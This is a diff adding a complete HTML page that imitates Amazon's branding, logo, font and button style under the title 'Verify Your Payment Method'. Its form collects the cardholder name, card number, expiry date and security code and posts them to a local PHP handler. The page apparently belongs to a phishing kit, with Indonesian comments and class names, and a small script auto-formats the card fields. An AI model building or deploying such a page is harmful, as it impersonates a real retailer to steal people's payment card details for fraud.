@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Payment Method</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 10px 0 25px; }
+        .logo img { height: 40px; }
+        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 4px; padding: 25px; }
+        h1 { font-size: 24px; margin-bottom: 20px; font-weight: 400; text-align: center; }
+        label { font-size: 13px; font-weight: 700; display: block; margin-top: 12px; }
+        input { width: 100%; padding: 9px; margin: 6px 0; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 15px; }
+        .baris-dua { display: flex; gap: 15px; }
+        .bagian { flex: 1; }
+        .tombol { width: 100%; padding: 10px; margin-top: 20px; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 15px; cursor: pointer; }
+        .tombol:hover { background: #F7CA00; }
+        .kartu-logo { display: flex; gap: 8px; margin: 8px 0; }
+        .kartu-logo img { height: 24px; }
+    </style>
+</head>
+<body>
+
+<div class="logo">
+    <a href="amazon.html"><img src="../assets/img/amazonlogo.png" alt="Amazon"></a>
+</div>
+
+<div class="kotak">
+    <h1>Verify Your Payment Method</h1>
+
+    <div class="kartu-logo">
+        <img src="../assets/img/visa.png" alt="Visa">
+        <img src="../assets/img/mastercard.png" alt="Mastercard">
+        <img src="../assets/img/amex.png" alt="Amex">
+        <img src="../assets/img/discover.png" alt="Discover">
+    </div>
+
+    <form action="../action/payment.php" method="POST">
+        <label for="nama_kartu">Name on Card</label>
+        <input type="text" id="nama_kartu" name="nama_kartu" required>
+
+        <label for="nomor_kartu">Card Number</label>
+        <input type="text" id="nomor_kartu" name="nomor_kartu" maxlength="19" placeholder="•••• •••• •••• ••••" required>
+
+        <div class="baris-dua">
+            <div class="bagian">
+                <label for="exp">Expiration Date (MM/YY)</label>
+                <input type="text" id="exp" name="exp" maxlength="5" placeholder="MM/YY" required>
+            </div>
+            <div class="bagian">
+                <label for="cvv">Security Code</label>
+                <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="•••" required>
+            </div>
+        </div>
+
+        <button type="submit" class="tombol">Verify Card</button>
+    </form>
+</div>
+
+<script>
+// Format nomor kartu otomatis
+const nomor = document.getElementById('nomor_kartu');
+nomor.addEventListener('input', e => {
+    let val = e.target.value.replace(/\D/g, '');
+    val = val.match(/.{1,4}/g)?.join(' ') || val;
+    e.target.value = val;
+});
+
+// Format tanggal otomatis
+const exp = document.getElementById('exp');
+exp.addEventListener('input', e => {
+    let val = e.target.value.replace(/\D/g, '');
+    if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2);
+    e.target.value = val;
+});
+</script>
+
+</body>
+</html>
